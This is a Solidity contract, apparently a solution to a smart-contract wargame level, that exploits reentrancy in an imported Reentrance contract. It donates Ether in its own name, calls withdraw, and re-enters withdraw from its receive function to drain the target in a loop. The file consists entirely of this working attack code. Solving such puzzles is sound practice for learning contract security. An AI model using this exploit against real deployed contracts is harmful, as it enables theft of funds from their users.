// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract HackReentrance {

    address reentranceContractAddr;

    constructor(address _reentranceContractAddr){
        reentranceContractAddr = _reentranceContractAddr;
    }

    function hack() external payable {
        Reentrance reentranceContract = Reentrance(payable(reentranceContractAddr));

        // Donate in the address of this contract itself
        require(msg.value != 0, "NEED VALUE");
        reentranceContract.donate{value: msg.value}(address(this));

        // Withdraw to cause loop (in the receive function)
        reentranceContract.withdraw(msg.value);
    }

    receive() external payable{
        Reentrance reentranceContract = Reentrance(payable(reentranceContractAddr));
        // Cause loop by calling withdraw again
        reentranceContract.withdraw(msg.value);
    }
}